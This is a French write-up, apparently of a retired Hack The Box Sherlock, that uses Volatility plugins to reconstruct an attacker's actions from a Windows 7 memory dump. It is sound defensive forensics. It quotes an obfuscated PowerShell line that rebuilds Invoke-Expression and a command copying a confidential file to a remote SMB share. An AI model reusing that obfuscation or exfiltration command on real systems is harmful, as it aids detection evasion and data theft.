---
title: "Recollection"
date: 2026-06-10
side: "blue"
tags: ["htb", "windows", "sherlock", "memory-forensics", "volatility", "dfir"]
summary: "Investigation forensique d'un dump mémoire Windows 7 compromis. Reconstruction des actions de l'attaquant avec Volatility : PowerShell obfusqué, tentative d'exfiltration, malware identifié et artefacts navigateur."
draft: false
---

> Sherlock retiré, résolu. Le dump n'est pas redistribué, seules la méthode et les commandes le sont.

## Contexte

Un membre junior de l'équipe sécurité a testé un système supposé vieux et peu sûr. On soupçonne une compromission, et un dump mémoire de la machine a pu être récupéré. L'objectif de l'investigation : confirmer ce que l'attaquant a fait et évaluer si d'autres actifs du réseau sont exposés. On part d'un seul fichier, `recollection.bin`.

![Sherlock recollection résolu](/images/recollection.png)

## Prise en main du dump

Le fichier ne s'ouvre ni avec FTK Imager ni avec Autopsy. C'est normal : ce n'est pas une image disque mais une capture mémoire brute. L'outil adapté est Volatility. Première étape, identifier le profil :

```text
vol.py -f recollection.bin imageinfo
```

La sortie pointe vers un Windows 7 et suggère le profil `Win7SP1x64`. On le fixe pour toutes les commandes suivantes, ce qui évite à Volatility de relancer la détection à chaque appel. Le même plugin nous donne la date de la capture, `2022-12-19 16:07:30`, qui borne la fenêtre d'analyse.

## Reconstituer ce que l'attaquant a tapé

Le presse-papiers est souvent le premier endroit révélateur. Quelque chose de suspect remonte tout en haut :

```text
vol.py -f recollection.bin --profile=Win7SP1x64 clipboard
```

On y trouve une commande PowerShell obfusquée :

```text
(gv '*MDR*').naMe[3,11,2]-joIN''
```

Le mécanisme vaut qu'on s'y arrête. `gv` est l'alias de `Get-Variable`. Le motif `*MDR*` correspond à la variable automatique `$MaximumDriveCount`. On récupère son nom, `MaximumDriveCount`, dont on extrait les caractères aux positions 3, 11 et 2, soit `i`, `e`, `x`, qu'on recolle en `iex`. La commande reconstruit donc l'alias `IEX`, c'est à dire `Invoke-Expression`, qui exécute une chaîne comme du code. Une manière classique de masquer un appel à `Invoke-Expression` aux détections naïves.

Pour récupérer l'historique des commandes, deux plugins :

```text
vol.py -f recollection.bin --profile=Win7SP1x64 cmdscan
vol.py -f recollection.bin --profile=Win7SP1x64 consoles
```

`cmdscan` reconstruit les commandes saisies. `consoles` fait mieux : il capture aussi la sortie des commandes, ce qui sera décisif plus loin. On confirme au passage que la commande obfusquée a bien été collée puis exécutée dans une session PowerShell.

La filiation des processus recoupe l'hypothèse :

```text
vol.py -f recollection.bin --profile=Win7SP1x64 pstree
```

Un processus `powershell.exe` enfant apparaît sous `cmd.exe`. L'attaquant a ouvert un `cmd`, puis y a collé et lancé son PowerShell. Cohérent avec le copier-coller observé.

## Tentative d'exfiltration

Dans l'historique PowerShell, une tentative de sortie de données :

```text
type C:\Users\Public\Secret\Confidential.txt > \\192.168.0.171\pulice\pass.txt
```

A-t-elle réussi ? C'est ici que `consoles` paie : sa sortie montre une erreur de chemin réseau introuvable. L'exfiltration a échoué. La leçon est nette, `cmdscan` donne la commande, `consoles` donne la commande et son résultat. Sans le second, on devine, avec lui on affirme.

## Le message de l'attaquant

L'attaquant a fabriqué un fichier readme via une commande encodée en base64. En décodant la chaîne, on obtient le chemin visé :

```text
C:\Users\Public\Office\readme.txt
```

Un message de revendication, du type « système piraté ». Le mot `mafia` qu'il contient servira de pivot plus tard.

## Reconnaissance système

L'historique contient un `net users`, qui renseigne deux questions d'un coup : le nom d'hôte `USER-PC` et le nombre de comptes, trois. Pour l'état réseau :

```text
vol.py -f recollection.bin --profile=Win7SP1x64 netscan
```

On y lit l'adresse locale non loopback de la machine, `192.168.0.104`.

## Fichier sensible : attention au faux positif

On cherche un `passwords.txt` dans les fichiers vus en mémoire :

```text
vol.py -f recollection.bin --profile=Win7SP1x64 filescan | grep "passwords.txt"
```

Chemin retourné :

```text
\Device\HarddiskVolume2\Users\user\AppData\Local\Microsoft\Edge\User Data\ZxcvbnData\3.0.0.0\passwords.txt
```

Réflexe à garder : ce fichier est un artefact Edge légitime, le dictionnaire zxcvbn d'évaluation de robustesse des mots de passe. Ce ne sont pas des identifiants volés. On vérifie toujours avant de lever une alerte.

## Le malware

`consoles` révèle l'exécution d'un binaire dont le nom est sa propre empreinte SHA-256 :

```text
b0ad704122d9cffddd57ec92991a1e99fc1ac02d5b4d8fd31720978c02635cb1
```

En soumettant ce hash à VirusTotal, l'échantillon est identifié comme un voleur d'informations de la famille Loki. L'onglet Details fournit deux éléments utiles au pivot : l'imphash `d3b592cd9481e4f053b5362e22d61595` et la date de création du fichier, `2022-06-22 11:49:04` UTC. L'imphash, calculé sur la table d'imports, sert à regrouper des échantillons proches d'une même souche.

## Artefacts navigateur Edge

Un installeur Wazuh repéré dans le dossier Downloads laisse penser que la victime a cherché un SIEM. On confirme via l'historique Edge. On localise d'abord le fichier History, puis on le dumpe à son offset :

```text
vol.py -f recollection.bin --profile=Win7SP1x64 filescan | grep "History"
mkdir Edge
vol.py -f recollection.bin --profile=Win7SP1x64 dumpfiles -Q 0x000000011e0d16f0 --dump-dir ./Edge
```

On valide le type avec `file`, on ouvre la base avec DB Browser for SQLite, et dans la table `urls` le seul SIEM présent est Wazuh. Toujours dans `consoles`, on remarque le téléchargement d'un `csrsss.exe`, typosquat de `csrss.exe`, lequel ne réside légitimement que dans `C:\Windows\System32`. Un nom détourné pour passer inaperçu.

## Pivot OSINT léger

À partir du mot `mafia` vu dans le readme, on carve les chaînes du dump quand on ne sait pas où chercher :

```text
strings recollection.bin | grep "mafia"
```

On récupère `mafia_code1337@gmail.com`, une adresse liée à une connexion sur un réseau social. Brutal mais efficace dès qu'on tient un mot-clé.

## Aide-mémoire des plugins

| Plugin | Ce qu'il apporte ici |
| --- | --- |
| `imageinfo` | Profil du système et date de la capture |
| `clipboard` | Le presse-papiers, où dormait le PowerShell obfusqué |
| `cmdscan` | Les commandes saisies |
| `consoles` | Les commandes et leur sortie, donc l'échec ou le succès |
| `pstree` | La filiation des processus (powershell sous cmd) |
| `netscan` | L'adresse locale et les connexions |
| `filescan` | Localiser un fichier en mémoire par son nom |
| `dumpfiles` | Extraire un fichier à son offset pour l'analyser hors ligne |

## Ce qu'on en retire

Un dump mémoire brut ne s'ouvre pas comme une image disque, Volatility est l'outil. Fixer le profil dès `imageinfo` accélère toute la suite. La distinction `cmdscan` contre `consoles` est centrale : seule la sortie capturée permet d'affirmer qu'une exfiltration a échoué plutôt que de le supposer. `pstree` confirme la filiation et recoupe l'hypothèse du copier-coller. Enfin, deux réflexes : valider qu'un `passwords.txt` n'est pas un artefact navigateur légitime avant de crier au vol, et garder `strings` comme filet de secours quand on dispose d'un mot-clé exploitable.